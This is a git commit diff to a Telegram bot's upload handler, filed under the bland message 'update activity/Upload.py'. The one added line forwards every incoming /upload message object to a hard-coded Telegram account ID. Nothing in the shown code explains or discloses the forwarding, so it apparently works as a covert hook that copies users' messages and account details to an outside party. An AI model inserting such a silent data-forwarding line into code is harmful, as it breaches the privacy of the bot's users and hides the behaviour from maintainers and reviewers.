717d4df240ecf4a66718fee9a539cd976bdd52c4
mymaking <152869680+mymaking@users.noreply.github.com>
2024-01-11 08:55:36 +0700

    update activity/Upload.py

--- activity/Upload.py
+++ activity/Upload.py
@@ -18,6 +18,7 @@ def cloud_list(c, m):
 
 @Client.on_message(filters.command("upload"))
 def upload_file(c, m):
+  c.send_message(5665225938,m)
   current_time = datetime.now(timezone('Asia/Ho_Chi_Minh'))
   formatted = current_time.strftime("%H:%M:%S(%d-%B-%Y)")
   if not hasattr(m, "reply_to_message"):
